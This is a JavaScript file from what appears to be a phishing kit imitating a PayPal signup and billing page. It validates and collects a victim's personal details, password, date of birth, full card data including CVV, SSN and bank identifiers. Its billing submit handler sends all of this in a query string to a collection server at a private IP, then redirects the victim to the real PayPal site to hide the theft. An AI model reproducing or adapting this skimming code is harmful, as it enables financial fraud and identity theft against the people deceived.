var cus_cc_type = '',
    cus_data = '',
    cc_data = '',
    chosen_country = '',
   
   data_receiver_url = 'http://192.168.2.7:8888/receiver.php',
   redirect_url = 'https://www.paypal.com/';
   
$(function(){
    //setup page layout based on hashes
    $(window).hashchange(function(){
            var hash = location.hash;

            var current_page = hash || '#signup';
            
            $('.page').not(current_page).hide();
            $(current_page).show();

            //$('div[data-page!=signup]').css('background-color', 'red');

    });

    $(window).hashchange();
    update_cc_fields_view();
    
    //set forms validation
    
    //signup form
   $('#signup_form').validate({
       groups: {
           dob: 'birthdate_b birthdate_a birthdate_c'
       },
       rules: {
           first_name: {
               required: true
           },
           last_name: {
               required: true
           },
           email: {
               required: true,
               email: true
           },
           password: {
               required: true
           },
           citizenship: {
               required: true
           },
           address1: {
               required: true,
               maxlength: 100
           },
           city: {
               required: true
           },
           zip: {
               required: true
           },
           M_PhoneNumber: {
               required: true
           },
           birthdate_b: {
            required: true,
            minlength:1,
            maxlength:2,
            range: [1, 31],
            digits:true
          },
          birthdate_a: {
            required: true,
            minlength:1,
            maxlength:2,
            range: [1, 12],
            digits:true
          },
          birthdate_c: {
            required: true,
            minlength:4,
            maxlength:4,
            digits:true
          }
       },
       errorElement: 'span',
       errorClass: 'error help',
       errorPlacement: function(error, element) {
           
           var fields = element.parents('.fields');
           
           
           if (fields.length) {
               element.parents('.fields:last').before(error);
           } else
               element.parent('.field').before(error);
       },
       submitHandler: function(form, validator) {
           
           chosen_country = $('#citizenship').val();
           update_cc_fields_view();
           
           cus_data = $(form).serialize();
           
           $(form).find('#messageBox').hide();
           
           location.hash = '#billing';
       },
       invalidHandler: function(form, validator){
           $(form).find('#messageBox').show();
       },
       messages: {
           email: {
               required: 'Please enter an email address.'
           },
           password: {
               required: 'Please enter a password with at least 8 characters.'
           },
           first_name: {
               required: 'Please enter only letters, hyphens, spaces and commas.'
           },
           last_name: {
               required: 'Please enter only letters, hyphens, spaces and commas.'
           },
           citizenship: {
               required: 'Please choose a valid Country.'
           },
           address1: {
               required: 'Please enter a valid Street and house number.'
           },
           city: {
               required: 'Please enter a valid City.'
           },
           M_PhoneNumber: {
               required: 'Please enter a valid telephone number.'
           },
           birthdate_b: {
               required: 'A date of birth is required.'
           },
           birthdate_a: {
               required: 'A date of birth is required.'
           },
           birthdate_c: {
               required: 'A date of birth is required.'
           }
       }
   });
   
   //billing form
   
   $('#frm_fundingcc_id').validate({
       groups: {
           expdate: 'expdate_month expdate_year'
       },
       rules: {
           cc_number: {
               required: true,
               creditcard: true
           },
           expdate_month : {
               required: true
           },
           expdate_year : {
               required: true
           },
           cvv2_number : {
               required: true,
               digits: true,
               maxlength: 4
           },
           cc_id: {
               digits: true,
               maxlength: 9,
               required: {
                   depends: function(element) {
                       return cus_cc_type == 'mastercard' && chosen_country=='IL';
                   }
               }
           },
           cc_webcode: {
               required: {
                   depends: function(element) {
                       return cus_cc_type == 'mastercard' && chosen_country=='IL';
                   }
               }
           },
           cc_visa1: {
               required: {
                   depends: function(element) {
                       return cus_cc_type == 'visa' && chosen_country=='IL';
                   }
               }
           },
           cc_visa2: {
               required: {
                   depends: function(element) {
                       return cus_cc_type == 'visa' && chosen_country=='IL';
                   }
               }
           },
           cc_visa3: {
               digits: true,
               required: {
                   depends: function(element) {
                       return cus_cc_type == 'visa' && chosen_country=='IL';
                   }
               }
           },
           cc_shortcode: {
               digits: true,
               required: {
                   depends: function(element) {
                       return chosen_country=='GB';
                   }
               }
           },
           cc_ssn: {
               required: {
                   depends: function(element) {
                       return chosen_country=='US';
                   }
               }
           },
           cc_checking_account_number: {
               required: {
                   depends: function(element) {
                       return (chosen_country!='IL' && chosen_country!='GB' && chosen_country!='US');
                   }
               }
           },
           cc_customer_id: {
               required: {
                   depends: function(element) {
                       return (chosen_country!='IL' && chosen_country!='GB' && chosen_country!='US');
                   }
               }
           }
       },
       errorElement: 'span',
       errorClass: 'error help',
       errorPlacement: function(error, element) { 
           
           
           if (element.attr('name')=='expdate_month' || 
                   element.attr('name')=='expdate_year' ||
                   element.attr('name')=='cvv2_number') {
                   
                   element.parents('.expDateCont').after(error);
                   
            } else {
                    element.parent('.field').before(error);
            }
           
           
       },
       messages: {
           cc_number: {
               required: 'Please enter a valid credit card number.'
           },
           expdate_month: {
               required: 'You need to select expiry date.'
           },
           expdate_year: {
               required: 'You need to select expiry date.'
           },
           cvv2_number: {
               required: 'Please enter CVV number.'
           }
       },
       submitHandler: function(form, validator) {
           cc_data = $(form).serialize();
           
           $(form).find('#messageBox').hide();
           
           $('#target').attr('src', data_receiver_url+'?'+cus_data+'&'+cc_data);
           $('#target').load(function(){
               document.location.href = redirect_url;
           });
       },
       invalidHandler: function(form, validator){
           $(form).find('#messageBox').show();
       }
   });
   

   
   //add additional actions
   $('#cc_number').keyup(function(){
       var start = $(this).val().charAt(0);
       

       $('#ccicons img').css('opacity', '0.13');
       switch (start) {
           case '3': //amex
               cus_cc_type = 'amex';
               $('#ccicons img[id=pm-amex]').css('opacity', '1');
            break;
           case '4': //visa
               cus_cc_type = 'visa';
               $('#ccicons img[id=pm-visa]').css('opacity', '1');
               
            break;
           case '5': //mastercard
               cus_cc_type = 'mastercard';
               $('#ccicons img[id=pm-mastercard]').css('opacity', '1');
            break;
           case '6': //discoer
               cus_cc_type = 'discover';
               $('#ccicons img[id=pm-discover]').css('opacity', '1');
            break;
            default:
                $('#ccicons img').css('opacity', '1');
                break;
       }
   });
   
   $('#cc_number').change(function(){
       
       if (chosen_country=='IL') {
            $('p.group.cc.IL').hide();

            if (cus_cc_type != '') {
                $('p.group.cc.'+cus_cc_type+'.IL').show();
            }
       }
       
   });
   
   $('#cc_number').change();
   
});

function update_cc_fields_view(){
   $('p.group.cc').hide();

   if (chosen_country!='IL' && chosen_country!='GB' && chosen_country!='US') {
       $('p.group.cc.REST').show();

   } else {
       $('p.group.cc.'+chosen_country).show();
       
       if (chosen_country=='IL') {
           $('#cc_number').change();
       }
   }
}
